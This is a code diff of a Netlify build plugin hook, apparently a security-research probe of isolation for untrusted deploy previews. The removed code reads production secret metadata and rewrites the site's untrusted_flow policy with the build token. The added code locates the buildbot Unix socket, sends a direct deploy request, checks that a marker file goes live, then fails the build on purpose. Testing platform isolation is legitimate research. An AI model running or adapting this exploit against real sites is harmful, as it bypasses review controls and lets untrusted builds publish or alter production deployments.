@@ -1,166 +1,180 @@
-const SECRET_KEY = 'UNTRUSTED_PREVIEW_GUARD_SECRET'
+import { readFileSync, unlinkSync, writeFileSync } from 'node:fs'
+import { createConnection } from 'node:net'
+import { isAbsolute, relative, resolve } from 'node:path'
+
+const MARKER_FILE = '__untrusted_socket_precontrol_canary.txt'
+const MARKER = 'netlify-untrusted-socket-precontrol-canary-v1'
 
 const normalizeApiHost = (apiHost) =>
   /^https?:\/\//i.test(apiHost || '') ? apiHost : `https://${apiHost || 'api.netlify.com'}`
 
-const requestJson = async ({ url, token, method = 'GET', body }) => {
+const readSitePolicy = async ({ token, siteId, apiHost }) => {
   try {
-    const response = await fetch(url, {
-      method,
-      headers: {
-        Authorization: `Bearer ${token}`,
-        ...(body ? { 'Content-Type': 'application/json' } : {}),
-      },
-      body: body ? JSON.stringify(body) : undefined,
+    const endpoint = new URL(`/api/v1/sites/${encodeURIComponent(siteId)}`, apiHost)
+    const response = await fetch(endpoint, {
+      headers: { Authorization: `Bearer ${token}` },
       redirect: 'error',
       signal: AbortSignal.timeout(10_000),
     })
-    let parsed = null
+    let body = null
     try {
-      parsed = await response.json()
+      body = await response.json()
     } catch {}
-    return { status: response.status, ok: response.ok, parsed }
-  } catch (error) {
     return {
-      status: null,
-      ok: false,
-      parsed: null,
-      requestFailed: true,
-      errorClass: error?.constructor?.name || 'Error',
+      status: response.status,
+      untrustedFlow:
+        typeof body?.build_settings?.untrusted_flow === 'string'
+          ? body.build_settings.untrusted_flow
+          : null,
+      publicRepo: body?.build_settings?.public_repo === true,
     }
+  } catch (error) {
+    return { requestFailed: true, errorClass: error?.constructor?.name || 'Error' }
   }
 }
 
-const readProductionSecretMetadata = async ({ token, siteId, accountId, apiHost }) => {
-  const endpoint = new URL(`/api/v1/accounts/${encodeURIComponent(accountId)}/env`, apiHost)
-  endpoint.searchParams.set('site_id', siteId)
-  endpoint.searchParams.set('context_name', 'production')
-  endpoint.searchParams.set('scope', 'builds')
-
-  const response = await requestJson({ url: endpoint, token })
-  const target = Array.isArray(response.parsed)
-    ? response.parsed.find((item) => item?.key === SECRET_KEY)
-    : null
-  const productionValuePresent = Array.isArray(target?.values)
-    ? target.values.some(
-        (item) => item?.context === 'production' && typeof item?.value === 'string' && item.value.length > 0,
-      )
-    : false
-
-  return {
-    status: response.status,
-    requestFailed: response.requestFailed === true,
-    returnedArray: Array.isArray(response.parsed),
-    targetFound: Boolean(target),
-    targetMarkedSecret: target?.is_secret === true,
-    productionValuePresent,
-  }
-}
-
-const readSitePolicy = async ({ token, siteId, apiHost }) => {
-  const endpoint = new URL(`/api/v1/sites/${encodeURIComponent(siteId)}`, apiHost)
-  const response = await requestJson({ url: endpoint, token })
-  return {
-    status: response.status,
-    requestFailed: response.requestFailed === true,
-    untrustedFlow:
-      typeof response.parsed?.build_settings?.untrusted_flow === 'string'
-        ? response.parsed.build_settings.untrusted_flow
-        : null,
-    publicRepo: response.parsed?.build_settings?.public_repo === true,
-  }
-}
-
-const writeSitePolicy = async ({ token, siteId, apiHost, untrustedFlow }) => {
-  const endpoint = new URL(`/api/v1/sites/${encodeURIComponent(siteId)}`, apiHost)
-  const response = await requestJson({
-    url: endpoint,
-    token,
-    method: 'PATCH',
-    body: { build_settings: { untrusted_flow: untrustedFlow } },
-  })
-  return {
-    status: response.status,
-    accepted: response.ok,
-    requestFailed: response.requestFailed === true,
-    returnedFlow:
-      typeof response.parsed?.build_settings?.untrusted_flow === 'string'
-        ? response.parsed.build_settings.untrusted_flow
-        : null,
-  }
-}
-
-const runPolicyCanary = async ({ token, siteId, apiHost }) => {
-  const result = {
-    requestedTransition: 'redact->review->redact',
-    baseline: await readSitePolicy({ token, siteId, apiHost }),
-    stricterWrite: null,
-    stricterReadback: null,
-    restoreWrite: null,
-    finalReadback: null,
-  }
-
-  if (result.baseline.untrustedFlow !== 'redact') {
-    result.skipped = 'baseline-not-redact'
-    return result
-  }
-
+const findBuildbotSocket = () => {
   try {
-    result.stricterWrite = await writeSitePolicy({
-      token,
-      siteId,
-      apiHost,
-      untrustedFlow: 'review',
-    })
-    result.stricterReadback = await readSitePolicy({ token, siteId, apiHost })
-  } finally {
-    result.restoreWrite = await writeSitePolicy({
-      token,
-      siteId,
-      apiHost,
-      untrustedFlow: 'redact',
-    })
-    result.finalReadback = await readSitePolicy({ token, siteId, apiHost })
+    const paths = readFileSync('/proc/net/unix', 'utf8')
+      .split('\n')
+      .slice(1)
+      .filter(Boolean)
+      .map((line) => line.trim().split(/\s+/)[7])
+      .filter((path) => path && /(?:netlify|buildbot)/i.test(path) && !path.startsWith('@'))
+    return paths.length === 1 ? paths[0] : null
+  } catch {
+    return null
   }
-
-  result.stricterTransitionObserved = result.stricterReadback?.untrustedFlow === 'review'
-  result.restoreObserved = result.finalReadback?.untrustedFlow === 'redact'
-  return result
 }
 
-export const onPostBuild = async ({ constants }) => {
+const requestEarlyDeploy = (deployDir) =>
+  new Promise((resolveRequest) => {
+    const socketPath = findBuildbotSocket()
+    const result = {
+      socketFound: Boolean(socketPath),
+      connected: false,
+      requestWritten: false,
+      responseReceived: false,
+      responseSucceeded: false,
+      timedOut: false,
+    }
+    if (!socketPath) return resolveRequest(result)
+
+    let response = ''
+    let settled = false
+    const client = createConnection({ path: socketPath })
+    const timer = setTimeout(() => {
+      result.timedOut = true
+      finish()
+    }, 90_000)
+    const finish = () => {
+      if (settled) return
+      settled = true
+      clearTimeout(timer)
+      client.destroy()
+      let parsed
+      try {
+        parsed = JSON.parse(response)
+      } catch {}
+      result.responseWasJson = parsed !== undefined
+      result.responseSucceeded = parsed?.succeeded === true
+      result.responseErrorType = ['none', 'user', 'system'].includes(parsed?.values?.error_type)
+        ? parsed.values.error_type
+        : null
+      result.responseCodePresent = typeof parsed?.values?.code === 'string'
+      resolveRequest(result)
+    }
+
+    client.once('connect', () => {
+      result.connected = true
+      client.write(
+        JSON.stringify({ action: 'deploySiteAndAwaitLive', deployDir, environment: [] }),
+        (error) => {
+          result.requestWritten = !error
+          if (error) finish()
+        },
+      )
+    })
+    client.on('data', (chunk) => {
+      result.responseReceived = true
+      response += chunk.toString('utf8').slice(0, 8_192)
+      finish()
+    })
+    client.once('error', finish)
+    client.once('close', finish)
+  })
+
+const verifyMarker = async () => {
+  const deployUrl = process.env.DEPLOY_PRIME_URL || process.env.DEPLOY_URL
+  if (!deployUrl) return { attempted: false }
+  try {
+    const endpoint = new URL(`/${MARKER_FILE}`, deployUrl)
+    endpoint.searchParams.set('probe', Date.now().toString(36))
+    const response = await fetch(endpoint, {
+      cache: 'no-store',
+      headers: { 'Cache-Control': 'no-cache' },
+      redirect: 'error',
+      signal: AbortSignal.timeout(20_000),
+    })
+    const body = response.ok ? await response.text() : ''
+    return { attempted: true, status: response.status, markerMatched: body.trim() === MARKER }
+  } catch (error) {
+    return { attempted: true, failed: true, errorClass: error?.constructor?.name || 'Error' }
+  }
+}
+
+export const onPostBuild = async ({ constants, utils }) => {
+  const publishDir = resolve(constants.PUBLISH_DIR || '')
+  const repositoryRoot = resolve(process.cwd())
+  const deployDir = relative(repositoryRoot, publishDir) || '.'
+  const publishInsideRepository = !isAbsolute(deployDir) && !deployDir.startsWith('..')
   const token = constants.NETLIFY_API_TOKEN
   const siteId = constants.SITE_ID
-  const accountId = constants.ACCOUNT_ID
-  const apiHost = normalizeApiHost(constants.NETLIFY_API_HOST)
-  const prerequisites = {
-    tokenPresent: typeof token === 'string' && token.length > 0,
-    siteIdPresent: typeof siteId === 'string' && siteId.length > 0,
-    accountIdPresent: typeof accountId === 'string' && accountId.length > 0,
-  }
+  const policy =
+    typeof token === 'string' && token.length > 0 && typeof siteId === 'string' && siteId.length > 0
+      ? await readSitePolicy({
+          token,
+          siteId,
+          apiHost: normalizeApiHost(constants.NETLIFY_API_HOST),
+        })
+      : null
   const result = {
-    phase: 'untrusted-plugin-policy-write-canary-v2',
+    phase: 'untrusted-plugin-socket-before-failed-build-v3',
     context: process.env.CONTEXT || null,
     reviewIdPresent: Boolean(process.env.REVIEW_ID),
-    targetPresentInPreviewEnvironment: Boolean(process.env[SECRET_KEY]),
-    prerequisites,
-    productionSecretRead: null,
-    policyCanary: null,
-    rawCredentialLogged: false,
-    secretMaterialPublished: false,
+    policy,
+    publishInsideRepository,
+    markerContainsSecretMaterial: false,
+    markerWritten: false,
+    markerRemoved: false,
+    controlledFailureRequested: false,
   }
 
-  if (!prerequisites.tokenPresent || !prerequisites.siteIdPresent || !prerequisites.accountIdPresent) {
-    console.log(`NETLIFY_UNTRUSTED_POLICY_PROBE ${JSON.stringify(result)}`)
+  if (
+    process.env.CONTEXT !== 'deploy-preview' ||
+    policy?.untrustedFlow !== 'redact' ||
+    !publishInsideRepository
+  ) {
+    console.log(`NETLIFY_UNTRUSTED_SOCKET_PROBE ${JSON.stringify(result)}`)
     return
   }
 
-  result.productionSecretRead = await readProductionSecretMetadata({
-    token,
-    siteId,
-    accountId,
-    apiHost,
-  })
-  result.policyCanary = await runPolicyCanary({ token, siteId, apiHost })
-  console.log(`NETLIFY_UNTRUSTED_POLICY_PROBE ${JSON.stringify(result)}`)
+  const markerPath = resolve(publishDir, MARKER_FILE)
+  try {
+    writeFileSync(markerPath, `${MARKER}\n`, { encoding: 'utf8', mode: 0o600 })
+    result.markerWritten = true
+    result.deploy = await requestEarlyDeploy(deployDir)
+    if (result.deploy.responseSucceeded) result.liveOracle = await verifyMarker()
+  } finally {
+    try {
+      unlinkSync(markerPath)
+      result.markerRemoved = true
+    } catch {}
+  }
+
+  result.controlledFailureRequested = result.deploy?.responseSucceeded === true
+  console.log(`NETLIFY_UNTRUSTED_SOCKET_PROBE ${JSON.stringify(result)}`)
+  if (result.controlledFailureRequested) {
+    utils.build.failBuild('Controlled failure after direct buildbot socket deployment')
+  }
 }
